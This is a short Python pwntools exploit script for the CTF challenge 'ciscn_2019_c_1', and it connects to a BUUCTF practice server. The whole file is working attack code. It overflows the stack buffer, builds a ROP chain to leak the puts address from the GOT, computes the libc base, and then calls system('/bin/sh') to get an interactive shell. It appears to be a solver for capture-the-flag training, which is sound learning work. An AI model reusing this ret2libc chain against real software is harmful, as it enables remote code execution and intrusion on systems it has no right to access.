from pwn import *

context.log_level = 'debug'

exe = ELF('./ciscn_2019_c_1', checksec=False)
libc = ELF('./libc-2.27.so', checksec=False)

# io = process('./ciscn_2019_c_1')
io = remote('node4.buuoj.cn', 26117)

OFFSET = 88

def send_choice(data):
    resp = io.sendlineafter(b'choice!\n', data)
    return resp

def send_encrypt(data):
    resp = io.sendlineafter(b'encrypted\n', data)
    return resp

rop = ROP(exe)
pop_rdi_ret = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]
main = exe.sym['main']

success(f'pop rdi; ret: {hex(pop_rdi_ret)}')
success(f'ret: {hex(ret)}')
success(f'main: {hex(main)}')

# (stage-1) leak puts got table
payload = asm('nop') * OFFSET + p64(pop_rdi_ret) + p64(exe.got['puts']) + p64(exe.plt['puts']) + p64(main) 

send_choice(b'1')
send_encrypt(payload)


# (stage-2) calculate offset
resp = send_choice(b'1').split(b'\n')[2]
puts_leak = resp.ljust(8, b'\x00')
puts_leak = u64(puts_leak)
libc.address = puts_leak - libc.sym.puts


success(f'libc base: {hex(libc.address)}')

# (stage-3) popping shell
bin_sh = next(libc.search(b'/bin/sh'))
payload = asm('nop') * OFFSET + p64(ret) + p64(pop_rdi_ret) + p64(bin_sh) + p64(libc.sym.system)
send_encrypt(payload)
io.interactive()
